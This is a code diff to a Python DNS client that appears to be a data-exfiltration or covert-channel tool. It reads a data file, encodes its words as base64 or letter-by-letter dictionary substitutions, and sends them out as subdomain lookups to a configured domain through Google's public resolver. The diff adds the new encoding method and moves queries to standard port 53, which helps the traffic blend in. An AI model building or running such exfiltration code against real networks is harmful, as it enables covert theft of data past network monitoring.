@@ -16,6 +16,7 @@ import socket
 import time
 import bitstring , struct # For constructing and destructing the DNS packet.
 from scapy.all import *
+import LookupDict as lookup
 
 
 def to_hex_string(x):
@@ -172,9 +173,11 @@ def resolve_host_name(host_name_to):
 
   # Send the packet off to the server.
 
-  DNS_IP = "141.226.242.178" # Google public DNS server IP.
+  # DNS_IP = "141.226.242.178" # Google public DNS server IP.
+  # DNS_PORT = 5053 # DNS server port for queries.
+  DNS_IP = "8.8.8.8" # Google public DNS server IP.
+  DNS_PORT = 53
 
-  DNS_PORT = 5053 # DNS server port for queries.
 
   READ_BUFFER = 1024 # The size of the buffer to read in the received UDP packet.
 
@@ -315,7 +318,20 @@ if __name__ == "__main__":
           word=word.strip(" ")
           word64=get_Base64_qeury(word)
           resolve_host_name(word64+"."+str(DOMAIN_NAME))
-          time.sleep(int(SECONDS_BETWEEN_QUERIES))
+          time.sleep(float(SECONDS_BETWEEN_QUERIES))
+
+    elif METHOD == "domain_based":
+      dict = lookup.LookupDict("client", "byDomain", "words.csv")
+      for line in data_file:
+        splited = line.split(",")
+        for word in splited:
+          word=word.lower()
+          for letter in word:
+            newWord = dict.transform(letter)
+            resolve_host_name(newWord+"."+str(DOMAIN_NAME))
+            time.sleep(float(SECONDS_BETWEEN_QUERIES))
+
+
   except Exception as e:
     pass
 
